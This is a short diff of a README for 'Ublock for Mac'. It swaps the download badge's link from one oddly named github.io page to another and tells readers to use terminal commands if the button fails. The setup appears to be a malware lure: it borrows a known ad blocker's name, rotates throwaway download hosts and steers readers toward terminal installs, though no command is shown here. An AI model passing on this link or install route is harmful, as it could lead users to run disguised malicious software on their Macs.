@@ -3,7 +3,7 @@
 
 Ublock for Mac is a fast and efficient ad blocker designed to make your browsing experience clean and distraction-free 🚀. You can easily install it on your Mac using the guide below.  
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/ublock)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/ublock)
 
 If the download button doesn’t work, please follow the installation instructions below using terminal commands.  
 
